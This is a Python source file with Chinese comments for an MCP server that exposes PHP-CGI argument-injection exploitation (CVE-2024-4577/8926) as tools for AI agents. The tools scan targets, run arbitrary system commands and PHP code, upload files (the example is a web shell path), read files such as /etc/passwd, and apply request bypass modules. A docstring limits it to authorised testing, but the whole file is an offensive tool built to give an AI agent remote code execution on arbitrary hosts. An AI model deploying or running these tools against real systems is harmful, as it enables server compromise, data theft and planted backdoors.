# -*- coding: utf-8 -*-
"""PHP-CGI MCP Server —— 把 PHP-CGI 参数注入利用能力暴露给 AI。

基于 CVE-2024-4577 / CVE-2024-8926（PHP-CGI 参数注入），提供：
  - phpcgi_scan        探测注入点
  - phpcgi_exec        执行系统命令
  - phpcgi_php         执行自定义 PHP 代码
  - phpcgi_upload      上传文件
  - phpcgi_download    下载文件
  - phpcgi_docroot     获取网站根目录
  - phpcgi_list_modules 列出 bypass 模块 / payload 组合

每个工具都接受 target（IP / IP:port / 域名 / URL），可指定 cgipoint、
payload_group、cve_id、bypass 模块列表。

⚠️ 仅供授权测试（企业红队、CTF、安全研究）。请勿用于未授权系统。

运行：
    uv run server.py        # 在 phpmcp 目录内
"""

import json
import os

from mcp.server.fastmcp import FastMCP
from pydantic import Field

import phpcgi

mcp = FastMCP("phpmcp")


def _bypass_list_desc() -> str:
    return "、".join(phpcgi.BYPASS_MODULES)


def _json(data) -> str:
    return json.dumps(data, ensure_ascii=False, indent=2)


@mcp.tool()
def phpcgi_scan(
    target: str = Field(description="目标 IP / IP:port / 域名 / URL，例如 192.168.1.10 或 http://1.2.3.4:8080"),
    cgipoints: str = Field(default="", description="逗号分隔的自定义 CGI 路径，例如 /a.php,/cgi-bin/php；留空用内置字典"),
    payload_group: str = Field(default="1", description="Payload 组合编号：1（全量）/ 2 / 3（最小），见 phpcgi_list_modules"),
    cve_id: str = Field(default="CVE-2024-4577", description="CVE 前缀：CVE-2024-4577 或 CVE-2024-8926"),
    bypass: str = Field(default="", description="逗号分隔的 bypass 模块名，例如 xff_ip_bypass,random_useragent；留空不绕过"),
    timeout: int = Field(default=10, ge=1, le=120, description="单请求超时秒数"),
) -> str:
    """探测目标是否存在 PHP-CGI 参数注入漏洞（CVE-2024-4577/8926）。

    返回第一个命中的注入点（cgipoint + url + 探针回显）。
    找到后可用 phpcgi_exec / phpcgi_upload 等继续利用。
    """
    bp = [x.strip() for x in bypass.split(",") if x.strip()] if bypass else None
    cps = [x.strip() for x in cgipoints.split(",") if x.strip()] if cgipoints else None
    try:
        r = phpcgi.scan(target, cps, payload_group, cve_id, bp, timeout, retries=1)
    except ValueError as e:
        return json.dumps({"error": str(e)}, ensure_ascii=False)
    return _json(r)


@mcp.tool()
def phpcgi_exec(
    target: str = Field(description="目标 IP / IP:port / 域名 / URL"),
    command: str = Field(description="要执行的系统命令，例如 whoami、id、ls -la /、cat /etc/passwd"),
    cgipoint: str = Field(default="", description="注入点路径（从 phpcgi_scan 得到）；留空则自动扫描"),
    payload_group: str = Field(default="1", description="Payload 组合编号：1 / 2 / 3"),
    cve_id: str = Field(default="CVE-2024-4577", description="CVE-2024-4577 或 CVE-2024-8926"),
    bypass: str = Field(default="", description="逗号分隔的 bypass 模块名；留空不绕过"),
    timeout: int = Field(default=10, ge=1, le=120, description="单请求超时秒数"),
) -> str:
    """在已确认的 PHP-CGI 注入点执行系统命令，返回命令输出。

    若未指定 cgipoint，会自动先探测注入点。
    """
    bp = [x.strip() for x in bypass.split(",") if x.strip()] if bypass else None
    try:
        r = phpcgi.exec_command(target, command, cgipoint or None, payload_group, cve_id, bp, timeout)
    except ValueError as e:
        return json.dumps({"error": str(e)}, ensure_ascii=False)
    return _json(r)


@mcp.tool()
def phpcgi_php(
    target: str = Field(description="目标 IP / IP:port / 域名 / URL"),
    php_code: str = Field(description="要执行的自定义 PHP 代码（无需 <?php 标签），例如 phpinfo(); 或 echo file_get_contents('/etc/passwd');"),
    cgipoint: str = Field(default="", description="注入点路径；留空则自动扫描"),
    payload_group: str = Field(default="1", description="Payload 组合编号：1 / 2 / 3"),
    cve_id: str = Field(default="CVE-2024-4577", description="CVE-2024-4577 或 CVE-2024-8926"),
    bypass: str = Field(default="", description="逗号分隔的 bypass 模块名；留空不绕过"),
    timeout: int = Field(default=10, ge=1, le=120, description="单请求超时秒数"),
) -> str:
    """在 PHP-CGI 注入点执行任意 PHP 代码，返回执行输出。"""
    bp = [x.strip() for x in bypass.split(",") if x.strip()] if bypass else None
    try:
        r = phpcgi.exec_php(target, php_code, cgipoint or None, payload_group, cve_id, bp, timeout)
    except ValueError as e:
        return json.dumps({"error": str(e)}, ensure_ascii=False)
    return _json(r)


@mcp.tool()
def phpcgi_upload(
    target: str = Field(description="目标 IP / IP:port / 域名 / URL"),
    remote_path: str = Field(description="目标服务器上的完整写入路径，例如 /var/www/html/shell.php"),
    content: str = Field(description="要写入的文件内容（文本）"),
    cgipoint: str = Field(default="", description="注入点路径；留空则自动扫描"),
    payload_group: str = Field(default="1", description="Payload 组合编号：1 / 2 / 3"),
    cve_id: str = Field(default="CVE-2024-4577", description="CVE-2024-4577 或 CVE-2024-8926"),
    bypass: str = Field(default="", description="逗号分隔的 bypass 模块名；留空不绕过"),
    timeout: int = Field(default=10, ge=1, le=120, description="单请求超时秒数"),
) -> str:
    """向目标服务器写入文件（需先知道注入点；未知可留空 cgipoint 自动扫描）。"""
    bp = [x.strip() for x in bypass.split(",") if x.strip()] if bypass else None
    try:
        r = phpcgi.upload(target, remote_path, content, cgipoint or None, payload_group, cve_id, bp, timeout)
    except ValueError as e:
        return json.dumps({"error": str(e)}, ensure_ascii=False)
    return _json(r)


@mcp.tool()
def phpcgi_download(
    target: str = Field(description="目标 IP / IP:port / 域名 / URL"),
    remote_path: str = Field(description="目标服务器上的文件路径，例如 /etc/passwd 或 C:/xampp/htdocs/index.php"),
    cgipoint: str = Field(default="", description="注入点路径；留空则自动扫描"),
    payload_group: str = Field(default="1", description="Payload 组合编号：1 / 2 / 3"),
    cve_id: str = Field(default="CVE-2024-4577", description="CVE-2024-4577 或 CVE-2024-8926"),
    bypass: str = Field(default="", description="逗号分隔的 bypass 模块名；留空不绕过"),
    timeout: int = Field(default=10, ge=1, le=120, description="单请求超时秒数"),
) -> str:
    """读取目标服务器上的文件内容并返回（文件内容原样回显）。"""
    bp = [x.strip() for x in bypass.split(",") if x.strip()] if bypass else None
    try:
        r = phpcgi.download(target, remote_path, cgipoint or None, payload_group, cve_id, bp, timeout)
    except ValueError as e:
        return json.dumps({"error": str(e)}, ensure_ascii=False)
    return _json(r)


@mcp.tool()
def phpcgi_docroot(
    target: str = Field(description="目标 IP / IP:port / 域名 / URL"),
    cgipoint: str = Field(default="", description="注入点路径；留空则自动扫描"),
    payload_group: str = Field(default="1", description="Payload 组合编号：1 / 2 / 3"),
    cve_id: str = Field(default="CVE-2024-4577", description="CVE-2024-4577 或 CVE-2024-8926"),
    bypass: str = Field(default="", description="逗号分隔的 bypass 模块名；留空不绕过"),
    timeout: int = Field(default=10, ge=1, le=120, description="单请求超时秒数"),
) -> str:
    """获取目标网站根目录（$_SERVER['DOCUMENT_ROOT']），用于确定上传落点。"""
    bp = [x.strip() for x in bypass.split(",") if x.strip()] if bypass else None
    try:
        r = phpcgi.docroot(target, cgipoint or None, payload_group, cve_id, bp, timeout)
    except ValueError as e:
        return json.dumps({"error": str(e)}, ensure_ascii=False)
    return _json(r)


@mcp.tool()
def phpcgi_list_modules() -> str:
    """列出可用的 bypass 模块、payload 组合、CGI 路径字典、CVE 前缀。"""
    info = {
        "bypass_modules": {
            name: desc for name, (desc, _) in phpcgi.BYPASS_MODULES.items()
        },
        "payload_groups": {
            k: [phpcgi.PAYLOAD_ELEMENTS[i] for i in v]
            for k, v in phpcgi.PAYLOAD_COMBINATIONS.items()
        },
        "cve_prefixes": dict(phpcgi.CVE_PREFIXES),
        "cgi_points": phpcgi.CGI_POINTS,
    }
    return _json(info)


if __name__ == "__main__":
    mcp.run()
